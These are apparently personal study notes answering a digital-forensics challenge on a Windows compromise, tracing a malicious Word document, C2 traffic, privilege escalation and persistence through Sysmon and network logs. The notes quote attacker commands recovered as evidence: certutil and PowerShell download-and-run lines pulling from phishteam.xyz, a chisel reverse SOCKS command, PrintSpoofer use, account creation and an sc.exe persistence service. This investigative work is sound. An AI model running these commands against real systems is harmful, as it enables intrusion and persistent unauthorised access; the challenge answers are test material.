---
created: 2026-01-29}T19:55
tags:
  - CyberChallenges
links:
  - "[[Windows]]"
  - "[[Digital Forensics]]"
---
# Tools used
- [[EvtxEcmd]]
- [[Timeline Explorer]]
- [[SysmonView]]

## Artifacts
```powershell
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv -> transforms an evtx file into csv
```
- Then just search the file with TimeLine Explorer
### Answers
```bash
1- Get-FileHash -Algorithm SHA256 .\capture.pcapng
CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
2-
Get-FileHash -Algorithm SHA256 .\sysmon.evtx
3-
Get-FileHash -Algorithm SHA256 .\windows.evtx
D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
```

## Initial Access - Malicious File
```powershell
1- The user of this machine was compromised by a malicious document. What is the file name of the document?  
-R : Please just check the sysmonview.

What is the name of the compromised user and machine?
R: benimaru-TEMPEST
-R : Please just check the sysmonview.

What is the PID of the Microsoft Word process that opened the malicious document?  
-R:496
-R : Please just check the sysmonview.

Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?  
-R:(167.71.199.191)
-R : Please just check the sysmonview.

What is the base64 encoded string in the malicious payload executed by the document?  
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg
-R: Use the TimeLine Explorer with the CSV done before.

What is the CVE number of the exploit used by the attacker to achieve a remote code execution?
-R: i searched the msdt.exe process remote code execution , found the cve:
2022–30190
```

## Initial Access - Stage 2 Execution
### Investigation
Investigation Guide
With the following discoveries, we may refer again to the cheatsheet to continue with the investigation:  
- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.
### Questions Done
```powershell
winword parent process id: 6596
Q: The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
*R:->* found it by searching zip, found the exe: sdiagnhost.exe
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Q: The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user
R: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe -> found by searching for explorer.exe

Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
R: searched for first.exe in payload, then filtered by either process initialized or terminated, found one after the certutil, which indicates it executed after the download:
CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
R: resolvecyber.xyz:80 -> we need to check for first.exe , then search for the DNSEvents in the Map Description. After this, search for first.exe and look for network connections in the same field. then you need to mix the ip found in the dnsevent to the network connection, opeen it and find the port.

```
Useful info about the process of the first question:
```powershell
{"EventData":{"Data":[{"@Name":"RuleName","#text":"T1023"},{"@Name":"UtcTime","#text":"2022-06-20 17:13:37.822"},{"@Name":"ProcessGuid","#text":"4bbef3ae-aabf-62b0-380a-000000000700"},{"@Name":"ProcessId","#text":"2628"},{"@Name":"Image","#text":"C:\\Windows\\SysWOW64\\sdiagnhost.exe"},{"@Name":"TargetFilename","#text":"C:\\Users\\benimaru\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.zip"},{"@Name":"CreationUtcTime","#text":"2022-06-20 17:13:37.822"},{"@Name":"User","#text":"TEMPEST\\benimaru"}]}}
```

## Initial Access - Malicious Document Traffic
```powershell
What is the URL of the malicious payload embedded in the document?
R: http://phishteam.xyz/02dcf07/index.html -> here just filter for phisteam.xyz, you will see after update.zip, it appears right away

What is the encoding used by the attacker on the c2 connection?
	-R: Consult Brim with _path=="http" "resolve", you will see that the URI when retriving, has base64 encoded things
	
The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?	
-R : q -> /9ab62b5?q=bmxx we  can see it has q has the parameter.
	
The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
-R: /9ab62b5 consult the URI before calling the final endpoint 64 based.

What is the HTTP method used by the binary?
-R : GET -> can consult in BRIM

Based on the user agent, what programming language was used by the attacker to compile the binary?
R: Just consult user agent in the same tab, appears nim/httpclient
```

## Internal Reconnaisance
```powershell
in brim used:
_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts

R: started checking the responses with the query mention and found:

base64 encrpypted-> Y2F0IEM6XFVzZXJzXEJlbmltYXJ1XERlc2t0b3BcYXV0b21hdGlvbi5wczEgLSAkdXNlciA9ICJURU1QRVNUXGJlbmltYXJ1Ig0KJHBhc3MgPSAiaW5mZXJub3RlbXBlc3QiDQoNCiRzZWN1cmVQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJHBhc3MgLUFzUGxhaW5UZXh0IC1Gb3JjZTsNCiRjcmVkZW50aWFsID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAkdXNlciwgJHNlY3VyZVBhc3N3b3JkDQoNCiMjIFRPRE86IEF1dG9tYXRlIGVhc3kgdGFza3MgdG8gaGFjayB3b3JraW5nIGhvdXJzDQo=

This translated to in cyberchef:
cat C:\Users\Benimaru\Desktop\automation.ps1 - $user = "TEMPEST\benimaru"
$pass = "infernotempest"

$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
## TODO: Automate easy tasks to hack working hours
R: so infernotempest

The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
R: copy one with the network -> bmV0C3RhdCAtYW5 i couldn't open so follow this:
https://sibasec.com/post/thm-tempest/

The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
R: C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks -> just search ch.exe

What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
R: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451 -> just check the same line as the previously in TimeLine Explorer in payload3 section

What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
R: found in virustotal
https://www.virustotal.com/gui/file/8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451 -> chisel

The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
R: WinRM -> search for "5895 service" on google and you will found it.
```

## Privilege Escalation:
```powershell
After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
R: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D -> this we should find in TimeExplorer, with the keyword *download* in executable info. then just search for the name and SHA256 in payload3

Based on the SHA256 hash of the binary, what is the name of the tool used?
R: -> printspoofer -> found online searching for spf.exe

The tool exploits a specific privilege owned by the user. What is the name of the privilege?
R: https://github.com/itm4n/PrintSpoofer -> `SeImpersonatePrivilege` privilegio abusado:
https://learn.microsoft.com/pt-br/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege outside info

Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
R: C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\final.exe -> found this line in searching spf.exe in payload, so was easy

The binary connects to a different port from the first c2 connection. What is the port used?
R: 8080 -> found this when searching the logs a while back, just saw two open ports, this was executed at 17:21, the port 8080 opened 17:21 as well, so i guessed by checking the recon it makes sense
```

## Actions on Objective
```powershell
Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
R: -> shion,shuna -> found by searching /add in the payload area in timeline Explorer

Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
R: searched for the shion user, and found two commands:
"C:\Windows\system32\net.exe" user shion m4st3rch3f!
"C:\Windows\system32\net.exe" user /add shion m4st3rch3f!
R:Just the /add missing

Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
-R : **4720**
Found online by seraching windows event id account creation

The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
R: net localgroup administrators /add shion -> found this by searching /add in the payload area  with the filter of NT AUTHORITY/SYSTEM as the user in timeline explorer

Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
R: 4732 -> found online searching for this one.

After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
R: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto -> searched in brim the hashes, and found some executions with the sc.exe 
-> searched online and found:
https://learn.microsoft.com/pt-br/windows-server/administration/windows-commands/sc-create
This is used for persistence autoruns in windows as well, suspicous after searching more in the logs of TimeExplorer, found the line mentioned above in payload area
```

### Notes:
```powershell
- Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`
- The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with **NT Authority\System.**
- All child events of the new malicious binary used for C2 are worth checking.
```
# References
https://ericzimmerman.github.io/#!index.md -> all the tools like EvtxECmd and Timeline Explorer
